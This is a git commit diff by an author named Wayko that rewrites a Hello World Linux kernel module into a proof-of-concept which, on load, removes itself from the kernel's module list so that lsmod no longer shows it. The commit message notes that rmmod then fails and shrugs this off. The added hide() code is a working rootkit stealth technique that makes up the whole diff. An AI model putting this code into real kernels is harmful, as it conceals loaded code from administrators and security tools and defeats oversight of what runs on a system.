0b45ca47e7801f7a76aea8df36ea911d848592ae
Wayko <franck@chvl.re>
2024-11-29 16:23:45 +0100

    feat(lsmod): lsmod working but can't rmmod >:D Who care ??

--- src/driver.c
+++ src/driver.c
@@ -1,19 +1,43 @@
-#include <linux/module.h>  
-#include <linux/kernel.h>  
-#include <linux/init.h>    
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>   
 
-static int __init driver_init(void) {
-    printk(KERN_INFO "[+] Module loaded: Hello World! [+]\n");
-    return 0;  
+
+void show(void);
+void hide(void);
+
+static struct list_head *prev_module;
+static short hidden = 0;
+
+void show(void)
+{
+    list_add(&THIS_MODULE->list, prev_module);
+    hidden = 0;
 }
 
-static void __exit driver_exit(void) {
-    printk(KERN_INFO "[+] Module unloaded: Goodbye World! [+]\n");
+void hide(void)
+{
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    hidden = 1;
 }
 
-module_init(driver_init);
-module_exit(driver_exit);
+static int __init lsmod_init(void)
+{
+    printk(KERN_INFO "[+] Module loaded: Hide from lsmod [+]\n");
+    hide();
+    return 0;
+}
+
+static void __exit lsmod_exit(void)
+{
+    printk(KERN_INFO "[+] Module unloaded: Hide from lsmod [+]\n");
+}
+
+module_init(lsmod_init);
+module_exit(lsmod_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Wayko");
-MODULE_DESCRIPTION("PoC module Hello World");
+MODULE_DESCRIPTION("PoC module Hide form lsmod");
